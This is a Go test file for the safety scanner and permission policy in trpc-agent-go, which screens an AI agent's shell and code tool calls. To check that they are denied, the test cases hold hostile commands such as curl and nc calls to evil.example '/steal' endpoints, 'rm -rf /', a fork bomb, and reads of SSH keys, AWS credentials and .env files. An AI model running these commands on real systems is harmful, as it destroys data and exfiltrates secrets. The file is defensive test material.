//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func TestAuditSinkEdgeCases(t *testing.T) {
	ev := AuditEvent{ToolName: "workspace_exec", Decision: DecisionAllow}

	require.NoError(t, (*WriterAuditSink)(nil).WriteAudit(ev))
	require.NoError(t, NewWriterAuditSink(nil).WriteAudit(ev))
	require.NoError(t, (*FileAuditSink)(nil).WriteAudit(ev))
	require.NoError(t, NewFileAuditSink("").WriteAudit(ev))
	require.NoError(t, (*recordingAuditSink)(nil).WriteAudit(ev))
	(*recordingAuditSink)(nil).clear()
	require.NoError(t, (*recordingAuditSink)(nil).lastErr())

	err := AppendAuditFile(filepath.Join(t.TempDir(), "missing", "audit.jsonl"), ev)
	require.Error(t, err)

	sink := newRecordingAuditSink(NewWriterAuditSink(failingWriter{}))
	require.Error(t, sink.WriteAudit(ev))
	require.Error(t, sink.lastErr())
	sink.clear()
	require.NoError(t, sink.lastErr())
}

func TestBlockedErrorMessages(t *testing.T) {
	var nilErr *BlockedError
	require.Equal(t, "tool safety guard blocked execution", nilErr.Error())

	err := NewBlockedError(Report{Decision: DecisionAsk})
	require.Equal(t, "tool safety guard returned ask", err.Error())

	err = NewBlockedError(Report{
		Decision: DecisionDeny,
		Findings: []Finding{{
			RuleID: ruleDangerousDelete,
		}},
	})
	require.Contains(t, err.Error(), ruleDangerousDelete)
}

func TestPolicyLoadAndNormalizeEdges(t *testing.T) {
	dir := t.TempDir()

	_, err := LoadPolicy(filepath.Join(dir, "missing.yaml"))
	require.Error(t, err)
	_, err = LoadPolicyStrict(filepath.Join(dir, "missing.yaml"))
	require.Error(t, err)

	jsonPath := filepath.Join(dir, "policy.json")
	require.NoError(t, os.WriteFile(jsonPath, []byte(`{
		"allowed_commands":["echo"],
		"parse_error_action":"needs_human_review"
	}`), 0o600))
	p, err := LoadPolicy(jsonPath)
	require.NoError(t, err)
	require.Equal(t, []string{"echo"}, p.AllowedCommands)
	require.Equal(t, DecisionAsk, p.ParseErrorAction)

	strictJSON := filepath.Join(dir, "strict.json")
	require.NoError(t, os.WriteFile(strictJSON, []byte(`{"unknown":true}`), 0o600))
	_, err = LoadPolicyStrict(strictJSON)
	require.Error(t, err)

	for _, tc := range []struct {
		name string
		body string
	}{
		{name: "max output", body: "max_output_bytes: -1\n"},
		{name: "long sleep", body: "long_sleep_seconds: -1\n"},
		{name: "bad decision", body: "parse_error_action: maybe\n"},
		{name: "empty decision", body: "parse_error_action: ''\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			path := filepath.Join(dir, strings.ReplaceAll(tc.name, " ", "_")+".yaml")
			require.NoError(t, os.WriteFile(path, []byte(tc.body), 0o600))
			_, err := LoadPolicyStrict(path)
			if tc.name == "empty decision" {
				require.NoError(t, err)
			} else {
				require.Error(t, err)
			}
		})
	}

	badExt := filepath.Join(dir, "policy.toml")
	require.NoError(t, os.WriteFile(badExt, []byte(""), 0o600))
	_, err = LoadPolicy(badExt)
	require.Error(t, err)
	_, err = LoadPolicyStrict(badExt)
	require.Error(t, err)

	badJSON := filepath.Join(dir, "bad.json")
	require.NoError(t, os.WriteFile(badJSON, []byte("{"), 0o600))
	_, err = LoadPolicy(badJSON)
	require.Error(t, err)
	_, err = LoadPolicyStrict(badJSON)
	require.Error(t, err)

	require.Equal(t, DecisionDeny, normalizeDecision("bad", DecisionDeny))
	require.Equal(t, AuditBestEffort, normalizeAuditFailureMode("bad", AuditBestEffort))
}

func TestScannerOptionsAndEdges(t *testing.T) {
	var audit bytes.Buffer
	scanner := NewScanner(Policy{}, nil, WithAuditSink(NewWriterAuditSink(&audit)))
	require.NotNil(t, scanner)
	require.NotEmpty(t, scanner.Policy().AllowedCommands)

	report := scanner.Scan(context.Background(), Request{
		ToolName: "workspace_exec",
		Command:  "echo ok",
	})
	require.Equal(t, BackendUnknown, report.Backend)
	require.Contains(t, audit.String(), `"decision":"allow"`)
	policyCopy := scanner.Policy()
	policyCopy.AllowedCommands[0] = "mutated"
	require.NotEqual(t, "mutated", scanner.Policy().AllowedCommands[0])

	var nilScanner *Scanner
	require.NotEmpty(t, nilScanner.Policy().AllowedCommands)
	report = nilScanner.Scan(context.Background(), Request{
		ToolName: "workspace_exec",
		Command:  "echo ok",
	})
	require.Equal(t, DecisionAllow, report.Decision)

	report = nilScanner.ScanOutput(context.Background(), Request{
		ToolName: "workspace_exec",
	}, "cat ~/.ssh/id_rsa")
	require.Equal(t, DecisionDeny, report.Decision)
	require.Equal(t, BackendUnknown, report.Backend)

	var outputAudit bytes.Buffer
	report = NewScanner(DefaultPolicy(), WithAuditSink(NewWriterAuditSink(&outputAudit))).
		ScanOutput(context.Background(), Request{ToolName: "workspace_exec"}, "ok")
	require.Equal(t, DecisionAllow, report.Decision)
	require.Contains(t, outputAudit.String(), `"decision":"allow"`)

	p := ProductionPolicy()
	report = NewScanner(p).Scan(context.Background(), Request{
		ToolName: "unknown_exec",
		RawArgs:  `{"note":"hello"}`,
	})
	require.Equal(t, DecisionAsk, report.Decision)
	require.True(t, hasRule(report, ruleUnknownBackend))
}

func TestScannerAdditionalBranches(t *testing.T) {
	scanner := NewScanner(DefaultPolicy())
	tests := []struct {
		name string
		req  Request
		rule string
	}{
		{
			name: "raw args code key",
			req: Request{
				ToolName: "mcp_custom",
				Backend:  BackendUnknown,
				RawArgs:  `{"python":{"code":"import os; os.system('rm -rf /')"}}`,
			},
			rule: ruleDangerousDelete,
		},
		{
			name: "raw args array and blank",
			req: Request{
				ToolName: "mcp_custom",
				Backend:  BackendUnknown,
				RawArgs:  `{"commands":["", "curl https://evil.example/x"]}`,
			},
			rule: ruleNetworkEgress,
		},
		{
			name: "raw argv dangerous delete",
			req: Request{
				ToolName: "mcp_custom",
				Backend:  BackendUnknown,
				RawArgs:  `{"args":["rm","-rf","/"]}`,
			},
			rule: ruleDangerousDelete,
		},
		{
			name: "ssh target host",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "ssh user@evil.example:/tmp/x",
			},
			rule: ruleNetworkEgress,
		},
		{
			name: "nc target host",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "nc evil.example 443",
			},
			rule: ruleNetworkEgress,
		},
		{
			name: "network command without host",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl -I",
			},
			rule: ruleNetworkEgress,
		},
		{
			name: "curl endpoint after output flag",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl -o out evil.example/steal",
			},
			rule: ruleNetworkEgress,
		},
		{
			name: "curl endpoint after method flag",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl -X POST evil.example/steal",
			},
			rule: ruleNetworkEgress,
		},
		{
			name: "aws path",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "cat /home/deploy/.aws/credentials",
			},
			rule: ruleSensitivePath,
		},
		{
			name: "max output",
			req: Request{
				ToolName:       "workspace_exec",
				Backend:        BackendWorkspaceExec,
				Command:        "echo ok",
				MaxOutputBytes: 1 << 22,
			},
			rule: ruleResourceOutput,
		},
		{
			name: "fork bomb",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  ":(){ :|:& };:",
			},
			rule: ruleResourceRuntime,
		},
		{
			name: "secret env value",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "echo ok",
				Env:      map[string]string{"API_TOKEN": "sk-abcdefghijklmnopqrstuvwxyz"},
			},
			rule: ruleSecretLeakage,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report := scanner.Scan(context.Background(), tc.req)
			require.NotEqual(t, DecisionAllow, report.Decision, report.Findings)
			require.True(t, hasRule(report, tc.rule), report.Findings)
		})
	}

	report := scanner.Scan(context.Background(), Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Args:     []string{"", "   "},
	})
	require.Equal(t, DecisionAllow, report.Decision)

	report = scanner.Scan(context.Background(), Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Args:     []string{""},
	})
	require.Equal(t, DecisionAllow, report.Decision)

	report = scanner.Scan(context.Background(), Request{
		ToolName: "mcp_custom",
		Backend:  BackendUnknown,
		RawArgs:  `{bad json`,
	})
	require.Equal(t, DecisionAllow, report.Decision)

	report = scanner.Scan(context.Background(), Request{
		ToolName: "mcp_custom",
		Backend:  BackendUnknown,
		RawArgs:  `{"items":[1,true,null]}`,
	})
	require.Equal(t, DecisionAllow, report.Decision)

	report = scanner.Scan(context.Background(), Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl https://evil.example/x evil.example/y",
	})
	require.Equal(t, DecisionDeny, report.Decision)
	require.True(t, hasRule(report, ruleNetworkEgress))
}

func TestPermissionPolicyAdditionalBranches(t *testing.T) {
	decision, err := (*PermissionPolicy)(nil).CheckToolPermission(context.Background(), nil)
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)

	pp := &PermissionPolicy{}
	decision, err = pp.CheckToolPermission(context.Background(), nil)
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)

	pp = NewPermissionPolicy(WithScanner(NewScanner(DefaultPolicy())), WithTelemetry(true))
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		Declaration: &tool.Declaration{Name: "workspace_exec"},
		Arguments:   []byte(`{"command":"echo ok","timeout_sec":1}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{bad json`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)

	pp = NewPermissionPolicy(WithPolicy(Policy{UnknownToolAction: DecisionAsk}))
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "plain_tool",
		Arguments: []byte(`{"note":"hello"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAsk, decision.Action)

	pp = NewPermissionPolicy(
		WithPolicy(Policy{UnknownToolAction: DecisionAllow}),
		WithTelemetry(true),
		WithAuditWriter(failingWriter{}),
		WithAuditFailureMode(AuditFailClosed),
	)
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "plain_tool",
		Arguments: []byte(`{"note":"hello"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, "audit failed")

	pp = NewPermissionPolicy(WithToolBackend("custom_host", BackendHostExec))
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "custom_host",
		Arguments: []byte(`{"cmd":"go test ./...","timeoutSec":1,"pty":true}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAsk, decision.Action)

	pp = NewPermissionPolicy(WithToolBackend("decl_shell", BackendWorkspaceExec))
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		Declaration: &tool.Declaration{Name: "decl_shell"},
		Arguments:   []byte(`{"cmd":"rm -rf /","timeoutSec":1}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)

	req, ok, err := parseByBackend("custom_unknown", Backend("custom"), []byte(`{"x":1}`))
	require.NoError(t, err)
	require.False(t, ok)
	require.Equal(t, Backend("custom"), req.Backend)

	_, _, err = RequestFromPermission(nil)
	require.Error(t, err)

	for _, tc := range []struct {
		name string
		fn   func() error
	}{
		{name: "write stdin", fn: func() error { _, err := parseWriteStdin("write_stdin", BackendHostExec, []byte(`{`)); return err }},
		{name: "skill run", fn: func() error { _, err := parseSkillRun("skill_run", []byte(`{`)); return err }},
		{name: "skill exec", fn: func() error { _, err := parseSkillExec("skill_exec", []byte(`{`)); return err }},
		{name: "host exec", fn: func() error { _, err := parseHostExec("exec_command", []byte(`{`)); return err }},
		{name: "code exec", fn: func() error { _, err := parseCodeExec("execute_code", []byte(`{`)); return err }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			require.Error(t, tc.fn())
		})
	}

	req, err = parseWorkspaceExec("workspace_exec", []byte(`{"command":"echo ok","timeoutSec":2}`))
	require.NoError(t, err)
	require.Equal(t, 2, req.TimeoutSec)
	req, err = parseWorkspaceExec("workspace_exec", []byte(`{"command":"echo ok","timeout_sec":5,"timeoutSec":2}`))
	require.NoError(t, err)
	require.Equal(t, 5, req.TimeoutSec)
	req, err = parseHostExec("exec_command", []byte(`{"command":"echo ok","timeout_sec":2}`))
	require.NoError(t, err)
	require.Equal(t, 2, req.TimeoutSec)
	req, err = parseHostExec("exec_command", []byte(`{"command":"echo ok","timeout_sec":5,"timeoutSec":2}`))
	require.NoError(t, err)
	require.Equal(t, 5, req.TimeoutSec)
}

func TestParseCodeBlocksShapes(t *testing.T) {
	blocks, err := parseCodeBlocks(nil)
	require.NoError(t, err)
	require.Nil(t, blocks)

	blocks, err = parseCodeBlocks([]byte(`"print(1)"`))
	require.NoError(t, err)
	require.Equal(t, []CodeBlock{{Language: "python", Code: "print(1)"}}, blocks)

	blocks, err = parseCodeBlocks([]byte(`"[{\"language\":\"bash\",\"code\":\"cat .env\"}]"`))
	require.NoError(t, err)
	require.Equal(t, []CodeBlock{{Language: "bash", Code: "cat .env"}}, blocks)

	blocks, err = parseCodeBlocks([]byte(`{"language":"bash","code":"echo ok"}`))
	require.NoError(t, err)
	require.Equal(t, []CodeBlock{{Language: "bash", Code: "echo ok"}}, blocks)

	_, err = parseCodeBlocks([]byte(`1`))
	require.Error(t, err)
	_, err = parseCodeBlocks([]byte(`{`))
	require.Error(t, err)
}

func TestPermissionOptionEdgeCases(t *testing.T) {
	p := &PermissionPolicy{}
	WithAuditWriter(bytes.NewBuffer(nil))(p)
	require.NotNil(t, p.scanner)

	p = &PermissionPolicy{}
	WithAuditFile(filepath.Join(t.TempDir(), "audit.jsonl"))(p)
	require.NotNil(t, p.scanner)

	WithAuditFailureMode(AuditFailureMode("bad"))(p)
	require.Equal(t, AuditBestEffort, p.auditFailureMode)

	WithToolBackend("   ", BackendWorkspaceExec)(p)
	require.Empty(t, p.toolBackends)

	p = NewPermissionPolicy(nil, WithScanner(nil))
	require.NotNil(t, p.scanner)
}

func TestPrimaryPermissionFindingTieBreaksOnDecision(t *testing.T) {
	f := primaryPermissionFinding([]Finding{
		{RuleID: "ask", RiskLevel: RiskHigh, Decision: DecisionAsk},
		{RuleID: "deny", RiskLevel: RiskHigh, Decision: DecisionDeny},
	})
	require.Equal(t, "deny", f.RuleID)
}

func TestRedactTextExported(t *testing.T) {
	p := DefaultPolicy()
	p.RedactSensitivePaths = true
	text, changed := RedactText("cat ~/.ssh/id_rsa token=sk-abcdefghijklmnopqrstuvwxyz", p)
	require.True(t, changed)
	require.NotContains(t, text, "~/.ssh")
	require.NotContains(t, text, "sk-abcdefghijklmnopqrstuvwxyz")
}

func TestScannerHelperEdges(t *testing.T) {
	require.False(t, downloadsIntoShell(nil))
	require.False(t, isDangerousRecursiveDelete("rm", []string{"rm", "/"}))
	require.False(t, isDangerousRecursiveDelete("rm", []string{"rm", "-rf", "tmp"}))
	require.Nil(t, unwrapCommandRunner("env", []string{"env", "-i", "A=B"}))
	require.Equal(t, []string{"curl"}, unwrapCommandRunner("timeout", []string{"timeout", "10", "curl"}))
	require.Nil(t, unwrapCommandRunner("echo", []string{"echo", "ok"}))
	require.False(t, looksLikeShellCommand(""))
	require.False(t, looksLikeShellCommand("hello"))
	require.True(t, looksLikeShellCommand("https://evil.example"))
	require.False(t, longSleep([]string{"sleep", "bad"}, 60))
	require.False(t, longSleep([]string{"sleep", "1"}, 60))
	require.True(t, longSleep([]string{"sleep", "2m"}, 60))
	require.True(t, longSleep([]string{"sleep", "1h"}, 60))
	require.True(t, longSleep([]string{"sleep", "1d"}, 60))
	require.False(t, longSleep([]string{"sleep", "1x"}, 60))
	require.Nil(t, extractQuotedCommands("fmt.Println(\"rm -rf /\")"))
	require.Equal(t, []string{"a", "b"}, uniqueStrings([]string{"a", "a", "b"}))
	require.Equal(t, "", hostFromURL("://bad"))
	require.False(t, domainAllowed("example.com", []string{"   "}))
	require.Equal(t, "", hostFromSchemelessTarget("not a host"))
	require.Equal(t, "", hostFromSchemelessTarget("bad/host"))
	require.Equal(t, "", hostFromSchemelessTarget(""))
	require.Equal(t, "localhost", hostFromSchemelessTarget("localhost:8080"))
	require.Equal(t, "example.com", hostFromSSHLikeTarget("git@example.com:path"))
	require.Equal(t, "echo ok", evidenceAround("echo ok", ""))
	require.Equal(t, "echo ok", evidenceAround("echo ok", "missing"))
	require.Equal(t, "bash", languageFromKey("tool.shell.code"))
	require.Equal(t, "python", languageFromKey("tool.python.source"))
	require.Equal(t, "", languageFromKey("tool.source"))
	require.True(t, looksLikeNetworkOperand("https://evil.example"))
	require.True(t, looksLikeNetworkOperand("evil.example/path"))
	require.False(t, looksLikeNetworkOperand("POST"))
}

type errorAuditSink struct{}

func (errorAuditSink) WriteAudit(AuditEvent) error { return errors.New("audit failed") }

func TestPermissionPolicyFailClosedWithNonRecordingSink(t *testing.T) {
	scanner := NewScanner(DefaultPolicy(), WithAuditSink(errorAuditSink{}))
	pp := NewPermissionPolicy(WithScanner(scanner), WithAuditFailureMode(AuditFailClosed))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"echo ok"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, "audit failed")
}
